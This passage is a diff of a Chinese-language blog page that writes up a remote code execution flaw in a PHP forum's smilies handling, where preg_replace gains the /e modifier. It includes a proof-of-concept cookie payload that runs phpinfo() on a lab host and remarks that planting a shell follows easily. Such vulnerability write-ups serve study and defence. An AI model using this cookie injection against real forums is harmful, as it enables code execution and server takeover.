         $message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);
         }
         ......</code></pre><p>119行 ：</p>
-<pre><code>$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);  //让 preg_replace 加上/e 修正符，产生代码执行</code></pre><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1" target="_blank" rel="noopener">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
+<pre><code>$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);  //让 preg_replace 加上/e 修正符，产生代码执行</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1" target="_blank" rel="noopener">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
 <pre><code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code></pre><p>如有漏洞，即可看到效果.<br>写个shell 自然也不是问题了~</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><img src="https://www.t00ls.net/attachments/month_1411/1411232121316afb1fac2c2397.jpg" alt=""></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><img src="https://www.t00ls.net/attachments/month_1411/1411232121316afb1fac2c2397.jpg" alt=""></p>
 
       
     </div>
